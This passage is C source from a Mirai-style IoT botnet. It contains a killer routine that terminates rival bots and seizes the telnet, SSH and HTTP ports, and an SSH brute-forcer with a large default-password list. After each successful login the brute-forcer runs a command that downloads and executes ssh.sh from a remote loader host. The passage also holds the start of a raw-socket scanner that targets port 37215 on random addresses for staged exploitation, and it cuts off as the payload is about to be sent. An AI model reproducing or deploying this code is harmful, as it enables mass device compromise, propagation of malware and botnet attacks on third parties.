    "636F726F6E61",
    "64757073",
    "6D6173757461",
    "626F746E6574",
    "637261636B6564",
    "736C756D70",
    "737464666C6F6F64",
    "756470666C6F6F64",
    "746370666C6F6F64",
    "68747470666C6F6F64",
    "6368696E6573652066616D696C79",
    "76737061726B7A7979",
    "736861646F68",
    "6F7369726973",
    "6B6F776169",
	"998F989C8F98D0CA8986859F8E8C868B988FC7848D838492EA", //ares generic mirai botkill
    "557365722D4167656E743A202573", //User-Agent: %s BOTKILL LOL
    "4F4D564A4750", // mirai encoded "mother"
    "445741494750", // mirai encoded "fucker"
    "4572726F7220647572696E67206E6F6E2D626C6F636B696E67206F7065726174696F6E3A" // old botkill for all bots version
};

int mem_exists(char *buf, int buf_len, char *str, int str_len)
{
    int matches = 0;

    if (str_len > buf_len)
        return 0;

    while (buf_len--)
    {
        if (*buf++ == str[matches])
        {
            if (++matches == str_len)
                return 1;
        }
        else
            matches = 0;
    }

    return 0;
}
int killer_pid;
char *killer_realpath;
int killer_realpath_len = 0;

int has_exe_access(void)
{
    char path[PATH_MAX], *ptr_path = path, tmp[16];
    int fd, k_rp_len;

    // Copy /proc/$pid/exe into path
    ptr_path += util_strcpy(ptr_path, "/proc/");
    ptr_path += util_strcpy(ptr_path, util_itoa(getpid(), 10, tmp));
    ptr_path += util_strcpy(ptr_path, "/exe");

    // Try to open file
    if ((fd = open(path, O_RDONLY)) == -1)
    {
        return 0;
    }
    close(fd);

    if ((k_rp_len = readlink(path, killer_realpath, PATH_MAX - 1)) != -1)
    {
        killer_realpath[k_rp_len] = 0;
    }

    util_zero(path, ptr_path - path);

    return 1;
}

int memory_j83j_match(char *path)
{
    int fd, ret;
    char rdbuf[4096];
    int found = 0;
    int i;
    if ((fd = open(path, O_RDONLY)) == -1) return 0;
    unsigned char searchFor[64];
    util_zero(searchFor, sizeof(searchFor));
    while ((ret = read(fd, rdbuf, sizeof (rdbuf))) > 0)
    {
        for (i = 0; i < NUMITEMS(knownBots); i++) {
            hex2bin(knownBots[i], util_strlen(knownBots[i]), searchFor);
            if (mem_exists(rdbuf, ret, searchFor, util_strlen(searchFor))){
                found = 1;
                break;
            }
            util_zero(searchFor, sizeof(searchFor));
        }
        
    }

    close(fd);

    return found;
}
#define KILLER_MIN_PID              400
#define KILLER_RESTART_SCAN_TIME    1
void killer_xywz(int parentpid)
{
    int killer_highest_pid = KILLER_MIN_PID, last_pid_j83j = time(NULL), tmp_bind_fd;
    uint32_t j83j_counter = 0;
    struct sockaddr_in tmp_bind_addr;

    // Let parent continue on main thread
    killer_pid = fork();
    if (killer_pid > 0 || killer_pid == -1)
        return;

    tmp_bind_addr.sin_family = AF_INET;
    tmp_bind_addr.sin_addr.s_addr = INADDR_ANY;

    // Kill telnet service and prevent it from restarting
#ifdef KILLER_REBIND_TELNET
    killer_kill_by_port(HTONS(23));
    
    tmp_bind_addr.sin_port = HTONS(23);

    if ((tmp_bind_fd = socket(AF_INET, SOCK_STREAM, 0)) != -1)
    {
        bind(tmp_bind_fd, (struct sockaddr *)&tmp_bind_addr, sizeof (struct sockaddr_in));
        listen(tmp_bind_fd, 1);
    }
#endif

    // Kill SSH service and prevent it from restarting
#ifdef KILLER_REBIND_SSH
    killer_kill_by_port(HTONS(22));
    
    tmp_bind_addr.sin_port = HTONS(22);

    if ((tmp_bind_fd = socket(AF_INET, SOCK_STREAM, 0)) != -1)
    {
        bind(tmp_bind_fd, (struct sockaddr *)&tmp_bind_addr, sizeof (struct sockaddr_in));
        listen(tmp_bind_fd, 1);
    }
#endif

    // Kill HTTP service and prevent it from restarting
#ifdef KILLER_REBIND_HTTP
    killer_kill_by_port(HTONS(80));
    tmp_bind_addr.sin_port = HTONS(80);

    if ((tmp_bind_fd = socket(AF_INET, SOCK_STREAM, 0)) != -1)
    {
        bind(tmp_bind_fd, (struct sockaddr *)&tmp_bind_addr, sizeof (struct sockaddr_in));
        listen(tmp_bind_fd, 1);
    }
#endif

    // In case the binary is getting deleted, we want to get the REAL realpath
  //  sleep(5);

    killer_realpath = malloc(PATH_MAX);
    killer_realpath[0] = 0;
    killer_realpath_len = 0;

    if (!has_exe_access())
    {
        return;
    }

    while (1)
    {
        DIR *dir;
        struct dirent *file;
        if ((dir = opendir("/proc/")) == NULL)
        {
            break;
        }
        while ((file = readdir(dir)) != NULL)
        {
            // skip all folders that are not PIDs
            if (*(file->d_name) < '0' || *(file->d_name) > '9')
                continue;

            char exe_path[64], *ptr_exe_path = exe_path, realpath[PATH_MAX];
            char status_path[64], *ptr_status_path = status_path;
            int rp_len, fd, pid = atoi(file->d_name);
            j83j_counter++;
            if (pid <= killer_highest_pid && pid != parentpid || pid != getpid()) //skip our parent and our own pid
            {
                if (time(NULL) - last_pid_j83j > KILLER_RESTART_SCAN_TIME) // If more than KILLER_RESTART_SCAN_TIME has passed, restart j83js from lowest PID for process wrap
                {
                    killer_highest_pid = KILLER_MIN_PID;
                }
                else
                {
                    if (pid > KILLER_MIN_PID && j83j_counter % 10 == 0)
                        sleep(1); // Sleep so we can wait for another process to spawn
                }

                continue;
            }
            if (pid > killer_highest_pid)
                killer_highest_pid = pid;
            last_pid_j83j = time(NULL);

            // Store /proc/$pid/exe into exe_path
            ptr_exe_path += util_strcpy(ptr_exe_path, "/proc/");
            ptr_exe_path += util_strcpy(ptr_exe_path, file->d_name);
            ptr_exe_path += util_strcpy(ptr_exe_path, "/exe");

            // Store /proc/$pid/status into status_path
            ptr_status_path += util_strcpy(ptr_status_path, "/proc/");
            ptr_status_path += util_strcpy(ptr_status_path, file->d_name);
            ptr_status_path += util_strcpy(ptr_status_path, "/status");

            // Resolve exe_path (/proc/$pid/exe) -> realpath
            if ((rp_len = readlink(exe_path, realpath, sizeof (realpath) - 1)) != -1)
            {
                realpath[rp_len] = 0; // Nullterminate realpath, since readlink doesn't guarantee a null terminated string

                // Skip this file if its realpath == killer_realpath
                if (pid == getpid() || pid == getppid() || util_strcmp(realpath, killer_realpath))
                    continue;

                if ((fd = open(realpath, O_RDONLY)) == -1)
                {
                    kill(pid, 9);
                }
                close(fd);
            }

            if (memory_j83j_match(exe_path))
            {
                kill(pid, 9);
            } 

            

            // Don't let others memory j83j!!!
            util_zero(exe_path, sizeof (exe_path));
            util_zero(status_path, sizeof (status_path));

            sleep(1);
        }

        closedir(dir);
    }
}

int killer_kill_by_port(int port)
{
    DIR *dir, *fd_dir;
    struct dirent *entry, *fd_entry;
    char path[PATH_MAX] = {0}, exe[PATH_MAX] = {0}, buffer[513] = {0};
    int pid = 0, fd = 0;
    char inode[16] = {0};
    char *ptr_path = path;
    int ret = 0;
    char port_str[16];

    util_itoa(ntohs(port), 16, port_str);
    if (util_strlen(port_str) == 2)
    {
        port_str[2] = port_str[0];
        port_str[3] = port_str[1];
        port_str[4] = 0;

        port_str[0] = '0';
        port_str[1] = '0';
    }

    fd = open("/proc/net/tcp", O_RDONLY);
    if (fd == -1)
        return 0;

    while (util_fdgets(buffer, 512, fd) != NULL)
    {
        int i = 0, ii = 0;

        while (buffer[i] != 0 && buffer[i] != ':')
            i++;

        if (buffer[i] == 0) continue;
        i += 2;
        ii = i;

        while (buffer[i] != 0 && buffer[i] != ' ')
            i++;
        buffer[i++] = 0;

        // Compare the entry in /proc/net/tcp to the hex value of the HTONS port
        if (util_stristr(&(buffer[ii]), util_strlen(&(buffer[ii])), port_str) != -1)
        {
            int column_index = 0;
            int in_column = 0;
            int listening_state = 0;

            while (column_index < 7 && buffer[++i] != 0)
            {
                if (buffer[i] == ' ' || buffer[i] == '\t')
                    in_column = 1;
                else
                {
                    if (in_column == 1)
                        column_index++;

                    if (in_column == 1 && column_index == 1 && buffer[i + 1] == 'A')
                    {
                        listening_state = 1;
                    }

                    in_column = 0;
                }
            }
            ii = i;

            if (listening_state == 0)
                continue;

            while (buffer[i] != 0 && buffer[i] != ' ')
                i++;
            buffer[i++] = 0;

            if (util_strlen(&(buffer[ii])) > 15)
                continue;

            util_strcpy(inode, &(buffer[ii]));
            break;
        }
    }
    close(fd);

    if (util_strlen(inode) == 0) {
        return 0;
    }

    if ((dir = opendir("/proc/")) != NULL) {
        while ((entry = readdir(dir)) != NULL && ret == 0) {
            char *pid = entry->d_name;

            // skip all folders that are not PIDs
            if (*pid < '0' || *pid > '9')
                continue;

            util_strcpy(ptr_path, "/proc/");
            util_strcpy(ptr_path + util_strlen(ptr_path), pid);
            util_strcpy(ptr_path + util_strlen(ptr_path), "/exe");

            if (readlink(path, exe, PATH_MAX) == -1)
                continue;

            util_strcpy(ptr_path, "/proc/");
            util_strcpy(ptr_path + util_strlen(ptr_path), pid);
            util_strcpy(ptr_path + util_strlen(ptr_path), "/fd");
            if ((fd_dir = opendir(path)) != NULL)
            {
                while ((fd_entry = readdir(fd_dir)) != NULL && ret == 0)
                {
                    char *fd_str = fd_entry->d_name;

                    util_zero(exe, PATH_MAX);
                    util_strcpy(ptr_path, "/proc/");
                    util_strcpy(ptr_path + util_strlen(ptr_path), pid);
                    util_strcpy(ptr_path + util_strlen(ptr_path), "/fd");
                    util_strcpy(ptr_path + util_strlen(ptr_path), "/");
                    util_strcpy(ptr_path + util_strlen(ptr_path), fd_str);
                    if (readlink(path, exe, PATH_MAX) == -1)
                        continue;

                    if (util_stristr(exe, util_strlen(exe), inode) != -1)
                    {
                        kill(util_atoi(pid, 10), 9);
                        ret = 1;
                    }
                }
                closedir(fd_dir);
            }
        }
        closedir(dir);
    }

    sleep(1);

    return ret;
}
#ifdef ENEMY
struct ssh_fds {
    uint16_t port;
    int sock;
    char ip[16];
};
 int waitsocket(int socket_fd, LIBSSH2_SESSION *session)
{

    struct timeval timeout;
    int rc;
    fd_set fd;
    fd_set *writefd = NULL;
    fd_set *readfd = NULL;
    int dir;
 
    timeout.tv_sec = 10;
    timeout.tv_usec = 0;
 
    FD_ZERO(&fd);
 
    FD_SET(socket_fd, &fd);
 
    dir = libssh2_session_block_directions(session);

 
    if(dir & LIBSSH2_SESSION_BLOCK_INBOUND)
        readfd = &fd;
 
    if(dir & LIBSSH2_SESSION_BLOCK_OUTBOUND)
        writefd = &fd;
 
    rc = select(socket_fd + 1, readfd, writefd, NULL, &timeout);
 
    return rc;
}

int checkauth(char *username, char *password, char *host)
{

  LIBSSH2_CHANNEL *channel;
  int rc;
 
 
    int sock = socket(AF_INET, SOCK_STREAM, 0);
    struct sockaddr_in sin;
    sin.sin_family = AF_INET;
    sin.sin_port = HTONS(22);
    sin.sin_addr.s_addr = inet_addr(host);
    if(connect(sock, (struct sockaddr*)(&sin),
                sizeof(struct sockaddr_in)) != 0) {
 //       // fprintf(stdout, "failed to connect!\n");
        return 1; //break out of brute loop and save time
    }
 
    LIBSSH2_SESSION *session = libssh2_session_init();

    libssh2_session_set_blocking(session, 0);

    while((rc = libssh2_session_handshake(session, sock)) ==
           LIBSSH2_ERROR_EAGAIN);
    if(rc) {
#ifdef SSHDEBUG
        fprintf(stderr, "Failure establishing SSH session: %d\n", rc);
#endif
        return 1;
    }


 
    while((rc = libssh2_userauth_password(session, username, password)) ==
          LIBSSH2_ERROR_EAGAIN);
    if(rc) {
#ifdef SSHDEBUG
    fprintf(stdout, "FAILED LOGIN! -> %s:22 %s:%s\n", host, username, password);
#endif
        return -1;
    }

#ifdef SSHDEBUG
    fprintf(stdout, "SUCCESSFUL SSH LOGIN! -> %s:22 %s:%s\n", host, username, password);
#endif

    while((channel = libssh2_channel_open_session(session)) == NULL &&
          libssh2_session_last_error(session, NULL, NULL, 0) ==
          LIBSSH2_ERROR_EAGAIN) {
        waitsocket(sock, session);
    }
    libssh2_session_set_blocking(session, 1);

    if(libssh2_channel_request_pty(channel, "vt100")) {
#ifdef SSHDEBUG
        fprintf(stderr, "Failed requesting pty\n");
#endif
        goto skip_shell;
    }

    if(libssh2_channel_shell(channel)) {        
#ifdef SSHDEBUG
        fprintf(stderr, "Unable to request shell on allocated pty\n");
#endif
        goto shutdown;
    }
    libssh2_session_set_blocking(session, 0);

    char rekdevice[512];
    memset(rekdevice, 0, sizeof(rekdevice));
    sprintf(rekdevice, "cd /tmp || cd /home/$USER || cd /var/run || cd /mnt; wget http://%s/ssh.sh -O ssh.sh || busybox wget http://%s/ssh.sh -O ssh.sh || curl http://%s/ssh.sh -O ssh.sh || busybox curl http://%s/ssh.sh -O ssh.sh; chmod 777 ssh.sh; ./ssh.sh; rm -f ssh.sh &\r\n", ldserver, ldserver, ldserver, ldserver);
   // printf("%s", rekdevice);
    int bufsize = strlen(rekdevice);
    int totwritten = 0;
    if(totwritten < bufsize) {
        int left = bufsize - totwritten;
        int size = (left < bufsize) ? left : bufsize;
        int n = libssh2_channel_write_ex(channel, 0, rekdevice, bufsize);
        if(n < 0) {
            return 1; //fail
        }
        else {
            totwritten += n;
        }
    }
    libssh2_channel_flush(channel);
    libssh2_channel_send_eof(channel);
    sleep(1);
#ifdef SSHDEBUG
    fprintf(stdout, "SUCCESSFUL SSH HACK! -> %s:22 %s:%s\n", host, username, password);
#endif
 
  skip_shell:
    if(channel) {
        libssh2_channel_free(channel);

        channel = NULL;
    }
 
  shutdown:
 
    if(session) {
        libssh2_session_disconnect(session, "");
        libssh2_session_free(session);

    }
    return 2;
}
#define __MAX_SSH_FORKS 8 //DONT CHANGE THIS LOL
#define __MAX_SSH_FDS 12 //DONT CHANGE THIS LOL
void sshj83j(void) {
    int f;
    for(f = 0; f < __MAX_SSH_FORKS; f++) {
        pid_t pid;
        pid = fork();
        if (pid < 0) {
            return;
        }
        if(pid == 0) {
            struct rlimit old;
            if (getrlimit(RLIMIT_NOFILE, &old) != -1) { old.rlim_cur = old.rlim_max; setrlimit(RLIMIT_NOFILE, &old); } //SET MAX FILE DESCRIPTORS CROSS PLATFORM
            int v, k, mode;
            char *passlist[] = {"root", "root", "root", "admin", "admin", "admin", "admin", "1234", "ubnt", "ubnt", "root", "toor", "user", "user", "support", "support", "admin", "password", "admin", "1234567890", "root", "1234", "root", "abc123", "vagrant", "vagrant", "CISCO", "CISCO", "netgear", "netgear", "root", "openelec", "osm", "osmpassword", "osmc", "osmc", "root", "letmein", "admin", "letmein", "operator", "operator", "user", "123456", "service", "service", "root", "linux", "root", "password", "test", "test", "admin", "admin123", "admin", "12345", "root", "calvin","administrator", "password","NetLinx", "password","administrator", "Amx1234!","amx", "password","amx", "Amx1234!","admin", "1988","admin", "admin","Administrator", "Vision2","cisco", "cisco","c-comatic", "xrtwk318","root", "qwasyx21","admin", "insecure","pi", "raspberry","user", "user","root", "default","root", "leostream","leo", "leo","localadmin", "localadmin","fwupgrade", "fwupgrade","root", "rootpasswd","admin", "password","root", "timeserver","admin", "motorola","cloudera", "cloudera","root", "p@ck3tf3nc3","apc", "apc","device", "apc","eurek", "eurek","netscreen", "netscreen","admin", "avocent","root", "linux","sconsole", "12345","root", "5up","cirros", "cubswin:)","root", "uClinux","root", "alpine","root", "dottie","root", "arcsight","root", "unitrends1","vagrant", "vagrant","root", "vagrant","m202", "m202","demo", "fai","root", "fai","root", "ceadmin","maint", "password","root", "palosanto","root", "ubuntu1404","root", "cubox-i","debian", "debian","root", "debian","root", "xoa","root", "sipwise","debian", "temppwd","root", "sixaola","debian", "sixaola","myshake", "shakeme","stackato", "stackato","root", "screencast","root", "stxadmin","root", "nosoup4u","root", "indigo","root", "video","default", "video","default", "","ftp", "video","nexthink", "123456","ubnt", "ubnt","root", "ubnt","sansforensics", "forensics","elk_user", "forensics","osboxes", "osboxes.org","root", "osboxes.org","sans", "training","user", "password","misp", "Password1234","hxeadm", "HXEHana1","acitoolkit", "acitoolkit","osbash", "osbash","enisa", "enisa","geosolutions", "Geos","pyimagesearch", "deeplearning","root", "NM1$88","remnux", "malware","hunter", "hunter","plexuser", "rasplex","root", "openelec","root", "rasplex","root", "plex","root", "openmediavault","root", "ys123456","root", "libreelec","openhabian", "openhabian","admin", "ManagementConsole2015","public", "publicpass","admin", "hipchat","nao", "nao","support", "symantec","root", "max2play","admin", "pfsense","root", "root01","root", "nas4free","USERID", "PASSW0RD","Administrator", "p@ssw0rd","root", "freenas","root", "cxlinux","admin", "symbol","admin", "Symbol","admin", "superuser","admin", "admin123","root", "D13HH[","root", "blackarch","root", "dasdec1","root", "7ujMko0admin","root", "7ujMko0vizxv","root", "Zte521","root", "zlxx.","root", "compass","hacker", "compass","samurai", "samurai","ubuntu", "ubuntu","root", "openvpnas","misp", "Password1234","root", "wazuh","student", "password123","root", "roottoor","centos", "reverse","root", "reverse","zyfwp", "PrOw!aN_fXp", "root", "root123", "root", "12345", "root", "juantech", "admin1", "password", "vodafone", "vodafone", "admin", "switch", "root", "123456", "admin", "changeme", "root", "cms500", "root", "oelinux123", "root", "vtech", "root", "zte9x15", "root", "antslq", "root", "Password", "root", "qwerty", "root", "pi", "pi", "raspberry"};
            char rekdevice[512];
            srand(time(NULL) ^ rand_cmwc() ^ getpid() + __MAX_SSH_FORKS);
            while (1) {
                struct ssh_fds *fds = calloc(__MAX_SSH_FDS, sizeof(struct ssh_fds));
                memset(fds, 0, sizeof(fds));
                for(mode = 0; mode < 3; mode++) {
                   for(k = 0; k < __MAX_SSH_FDS; k++) {
                        if(mode == 0) {
                            struct sockaddr_in address;
                            memset(&address, 0, sizeof(address));
                            address.sin_family = AF_INET;
                            address.sin_addr.s_addr = getPIP();
                            sprintf(fds[k].ip, "%s", inet_ntoa(address.sin_addr));
                            address.sin_port = HTONS(22);
                            fds[k].sock = socket(AF_INET, SOCK_STREAM, 0);
                            fcntl(fds[k].sock, F_SETFL, O_NONBLOCK);
                            connect(fds[k].sock, (struct sockaddr *)&address, sizeof(address));
                        } else {
                            if(fds[k].sock<=0) continue;
                            struct pollfd pfd[1];
                            pfd[0].fd = fds[k].sock;
                            pfd[0].events = POLLOUT;
                            if (poll(pfd, 1, 12) > 0)
                            {
                                for(v = 0; v < NUMITEMS(passlist); v+=2) {
                                    if(checkauth(passlist[v], passlist[v+1], fds[k].ip)>0) break;
                                }
                                fds[k].sock = -1;
                            }
                        }
                    }
                }
            }
        }
    }
}
#endif 
#ifdef Kvjei9ffj83j

#define Kvjei9ffj83j_SCANNER_MAX_CONNS 256
#define Kvjei9ffj83j_SCANNER_RAW_PPS 384
#define Kvjei9ffj83j_SCANNER_RDBUF_SIZE 1024
#define Kvjei9ffj83j_SCANNER_HACK_DRAIN 64

struct Kvjei9ffj83j_j83j_connection
{
    int fd, last_recv;
    enum
    {
        Kvjei9ffj83j_SC_CLOSED,
        Kvjei9ffj83j_SC_CONNECTING,
        Kvjei9ffj83j_SC_EXPLOIT_STAGE2,
        Kvjei9ffj83j_SC_EXPLOIT_STAGE3,
    } state;
    ipv4_t dst_addr;
    uint16_t dst_port;
    int rdbuf_pos;
    char rdbuf[Kvjei9ffj83j_SCANNER_RDBUF_SIZE];
    char payload_buf[1024];
};
int Kvjei9ffj83j_rsck = 0, Kvjei9ffj83j_rsck_out = 0;
char Kvjei9ffj83j_j83j_rawpkt[sizeof(struct iphdr) + sizeof(struct tcphdr)] = {0};
uint32_t Kvjei9ffj83j__aa = 0;

int Kvjei9ffj83j_recv_strip_null(int sock, void *buf, int len, int flags)
{
    int ret = recv(sock, buf, len, flags);
    if(ret > 0)
    {
        int i = 0;
        for(i = 0; i < ret; i++)
        {
            if(((char *)buf)[i] == 0x00)
            {
                ((char *)buf)[i] = 'A';
            }
        }
    }
    return ret;
}

static void Kvjei9ffj83j_setup_connection(struct Kvjei9ffj83j_j83j_connection *conn)
{
    struct sockaddr_in addr = {0};
    if(conn->fd != -1)
        close(conn->fd);
    if((conn->fd = socket(AF_INET, SOCK_STREAM, 0)) == -1)
    {
        return;
    }
    conn->rdbuf_pos = 0;
    memset(conn->rdbuf, 0, sizeof(conn->rdbuf));
    fcntl(conn->fd, F_SETFL, O_NONBLOCK | fcntl(conn->fd, F_GETFL, 0));
    addr.sin_family = AF_INET;
    addr.sin_addr.s_addr = conn->dst_addr;
    addr.sin_port = conn->dst_port;
    conn->last_recv = Kvjei9ffj83j__aa;
    if(conn->state == Kvjei9ffj83j_SC_EXPLOIT_STAGE2 || conn->state == Kvjei9ffj83j_SC_EXPLOIT_STAGE3)
    {
    }
    else
    {
        conn->state = Kvjei9ffj83j_SC_CONNECTING;
    }
    connect(conn->fd, (struct sockaddr *)&addr, sizeof(struct sockaddr_in));
}

static ipv4_t Kvjei9ffj83j_get_random_ip(void)
{
    uint32_t tmp;
    uint8_t o1 = 0, o2 = 0, o3 = 0, o4 = 0;
    do
    {
        tmp = rand_next();

        o1 = tmp & 0xff;
        o2 = (tmp >> 8) & 0xff;
        o3 = (tmp >> 16) & 0xff;
        o4 = (tmp >> 24) & 0xff;
    }
    while(o1 == 127 ||                             // 127.0.0.0/8      - Loopback
          (o1 == 0) ||                              // 0.0.0.0/8        - Invalid address space
          (o1 == 3) ||                              // 3.0.0.0/8        - General Electric Company
          (o1 == 15 || o1 == 16) ||                 // 15.0.0.0/7       - Hewlett-Packard Company
          (o1 == 56) ||                             // 56.0.0.0/8       - US Postal Service
          (o1 == 10) ||                             // 10.0.0.0/8       - Internal network
          (o1 == 192 && o2 == 168) ||               // 192.168.0.0/16   - Internal network
          (o1 == 172 && o2 >= 16 && o2 < 32) ||     // 172.16.0.0/14    - Internal network
          (o1 == 100 && o2 >= 64 && o2 < 127) ||    // 100.64.0.0/10    - IANA NAT reserved
          (o1 == 169 && o2 > 254) ||                // 169.254.0.0/16   - IANA NAT reserved
          (o1 == 198 && o2 >= 18 && o2 < 20) ||     // 198.18.0.0/15    - IANA Special use
          (o1 >= 224) ||                            // 224.*.*.*+       - Multicast
          (o1 == 6 || o1 == 7 || o1 == 11 || o1 == 21 || o1 == 22 || o1 == 26 || o1 == 28 || o1 == 29 || o1 == 30 || o1 == 33 || o1 == 55 || o1 == 214 || o1 == 215) // Department of Defense
    );
    int randnum = rand() % 10;
    if (randnum == 0)
    {
        return INET_ADDR(156,o2,o3,o4);
    }
    if (randnum == 1)
    {
        return INET_ADDR(197,o2,o3,o4);
    }
    if (randnum == 2)
    {
        return INET_ADDR(41,o2,o3,o4);
    }
    if (randnum == 3)
    {
        return INET_ADDR(223,8,o3,o4);
    }
    if (randnum == 4)
    {
        return INET_ADDR(196,o2,o3,o4);
    }
    if (randnum == 5)
    {
        return INET_ADDR(134,o2,o3,o4);
    }
    if (randnum == 6)
    {
        return INET_ADDR(46,o2,o3,o4);
    }
    if (randnum == 7)
    {
        return INET_ADDR(181,o2,o3,o4);
    }
    if (randnum == 8)
    {
        return INET_ADDR(o1,o2,o3,o4);
    }
}
int Kvjei9ff_pid;
void Kvjei9ff_init(void)
{
    int i = 0;
    uint16_t source_port;
    struct iphdr *iph;
    struct tcphdr *tcph;
    Kvjei9ff_pid = fork();
    if(Kvjei9ff_pid > 0 || Kvjei9ff_pid == -1)
        return;
    LOCAL_ADDR = util_local_addr();
    init_rand(time(NULL) ^ getpid() ^ getppid());
    Kvjei9ffj83j__aa = time(NULL);
    struct Kvjei9ffj83j_j83j_connection *ctableuv = calloc(Kvjei9ffj83j_SCANNER_MAX_CONNS, sizeof(struct Kvjei9ffj83j_j83j_connection));
    for(i = 0; i < Kvjei9ffj83j_SCANNER_MAX_CONNS; i++)
    {
        ctableuv[i].state = Kvjei9ffj83j_SC_CLOSED;
        ctableuv[i].fd = -1;
    }
    if((Kvjei9ffj83j_rsck = socket(AF_INET, SOCK_RAW, IPPROTO_TCP)) == -1)
    {
        #ifdef DEBUG
            printf("[Kvjei9ff] failed to initialize raw socket, cannot j83j\n");
        #endif
        exit(0);
    }
    fcntl(Kvjei9ffj83j_rsck, F_SETFL, O_NONBLOCK | fcntl(Kvjei9ffj83j_rsck, F_GETFL, 0));
    i = 1;
    if(setsockopt(Kvjei9ffj83j_rsck, IPPROTO_IP, IP_HDRINCL, &i, sizeof(i)) != 0)
    {
        #ifdef DEBUG
            printf("[Kvjei9ff] failed to set IP_HDRINCL, cannot j83j\n");
        #endif
        close(Kvjei9ffj83j_rsck);
        exit(0);
    }

    do
    {
        source_port = rand_next() & 0xffff;
    }
    while(ntohs(source_port) < 1024);

    iph = (struct iphdr *)Kvjei9ffj83j_j83j_rawpkt;
    tcph = (struct tcphdr *)(iph + 1);
    iph->ihl = 5;
    iph->version = 4;
    iph->tot_len = htons(sizeof(struct iphdr) + sizeof(struct tcphdr));
    iph->id = rand_next();
    iph->ttl = 64;
    iph->protocol = IPPROTO_TCP;
    tcph->dest = htons(37215);
    tcph->source = source_port;
    tcph->doff = 5;
    tcph->window = rand_next() & 0xffff;
    tcph->syn = 1;
    #ifdef DEBUG
        printf("[Kvjei9ff] j83j process initialized. j83jning started.\n");
    #endif
    while(1)
    {
        fd_set fdset_rd, fdset_wr;
        struct Kvjei9ffj83j_j83j_connection *conn;
        struct timeval tim;
        int last_avail_conn, last_spew, mfd_rd = 0, mfd_wr = 0, nfds;
        if(Kvjei9ffj83j__aa != last_spew)
        {
            last_spew = Kvjei9ffj83j__aa;

            for(i = 0; i < Kvjei9ffj83j_SCANNER_RAW_PPS; i++)
            {
                struct sockaddr_in paddr = {0};
                struct iphdr *iph = (struct iphdr *)Kvjei9ffj83j_j83j_rawpkt;
                struct tcphdr *tcph = (struct tcphdr *)(iph + 1);
                iph->id = rand_next();
                iph->saddr = LOCAL_ADDR;
                iph->daddr = Kvjei9ffj83j_get_random_ip();
                iph->check = 0;
                iph->check = checksum_generic((uint16_t *)iph, sizeof(struct iphdr));
                tcph->dest = htons(37215);
                tcph->seq = iph->daddr;
                tcph->check = 0;
                tcph->check = checksum_tcpudp(iph, tcph, htons(sizeof(struct tcphdr)), sizeof(struct tcphdr));
                paddr.sin_family = AF_INET;
                paddr.sin_addr.s_addr = iph->daddr;
                paddr.sin_port = tcph->dest;
                sendto(Kvjei9ffj83j_rsck, Kvjei9ffj83j_j83j_rawpkt, sizeof(Kvjei9ffj83j_j83j_rawpkt), MSG_NOSIGNAL, (struct sockaddr *)&paddr, sizeof(paddr));
            }
        }
        last_avail_conn = 0;
        while(1)
        {
            int n = 0;
            char dgram[1514];
            struct iphdr *iph = (struct iphdr *)dgram;
            struct tcphdr *tcph = (struct tcphdr *)(iph + 1);
            struct Kvjei9ffj83j_j83j_connection *conn;
            errno = 0;
            n = recvfrom(Kvjei9ffj83j_rsck, dgram, sizeof(dgram), MSG_NOSIGNAL, NULL, NULL);
            if(n <= 0 || errno == EAGAIN || errno == EWOULDBLOCK)
                break;
            if(n < sizeof(struct iphdr) + sizeof(struct tcphdr))
                continue;
            if(iph->daddr != LOCAL_ADDR)
                continue;
            if(iph->protocol != IPPROTO_TCP)
                continue;
            if(tcph->source != htons(37215))
                continue;
            if(tcph->dest != source_port)
                continue;
            if(!tcph->syn)
                continue;
            if(!tcph->ack)
                continue;
            if(tcph->rst)
                continue;
            if(tcph->fin)
                continue;
            if(htonl(ntohl(tcph->ack_seq) - 1) != iph->saddr)
                continue;
            conn = NULL;
            for(n = last_avail_conn; n < Kvjei9ffj83j_SCANNER_MAX_CONNS; n++)
            {
                if(ctableuv[n].state == Kvjei9ffj83j_SC_CLOSED)
                {
                    conn = &ctableuv[n];
                    last_avail_conn = n;
                    break;
                }
            }
            if(conn == NULL)
                break;
            conn->dst_addr = iph->saddr;
            conn->dst_port = tcph->source;
            Kvjei9ffj83j_setup_connection(conn);
        }
        FD_ZERO(&fdset_rd);
        FD_ZERO(&fdset_wr);
        for(i = 0; i < Kvjei9ffj83j_SCANNER_MAX_CONNS; i++)
        {
            int timeout = 5;
            conn = &ctableuv[i];
            if(conn->state != Kvjei9ffj83j_SC_CLOSED && (Kvjei9ffj83j__aa - conn->last_recv) > timeout)
            {
                close(conn->fd);
                conn->fd = -1;
                conn->state = Kvjei9ffj83j_SC_CLOSED;
                memset(conn->rdbuf, 0, sizeof(conn->rdbuf));
                continue;
            }
            if(conn->state == Kvjei9ffj83j_SC_CONNECTING || conn->state == Kvjei9ffj83j_SC_EXPLOIT_STAGE2 || conn->state == Kvjei9ffj83j_SC_EXPLOIT_STAGE3)
            {
                FD_SET(conn->fd, &fdset_wr);
                if(conn->fd > mfd_wr)
                    mfd_wr = conn->fd;
            }
            else if(conn->state != Kvjei9ffj83j_SC_CLOSED)
            {
                FD_SET(conn->fd, &fdset_rd);
                if(conn->fd > mfd_rd)
                    mfd_rd = conn->fd;
            }
        }
        tim.tv_usec = 0;
        tim.tv_sec = 1;
        nfds = select(1 + (mfd_wr > mfd_rd ? mfd_wr : mfd_rd), &fdset_rd, &fdset_wr, NULL, &tim);
        Kvjei9ffj83j__aa = time(NULL);
        for(i = 0; i < Kvjei9ffj83j_SCANNER_MAX_CONNS; i++)
        {
            conn = &ctableuv[i];
            if(conn->fd == -1)
                continue;
            if(FD_ISSET(conn->fd, &fdset_wr))
            {
                int err = 0, ret = 0;
                socklen_t err_len = sizeof(err);
                ret = getsockopt(conn->fd, SOL_SOCKET, SO_ERROR, &err, &err_len);
                if(err == 0 && ret == 0)
                {
                    if(conn->state == Kvjei9ffj83j_SC_EXPLOIT_STAGE2)
                    {
                        #ifdef DEBUG
                            printf("[Kvjei9ff] FD%d sending payload\n", conn->fd);
                        #endif
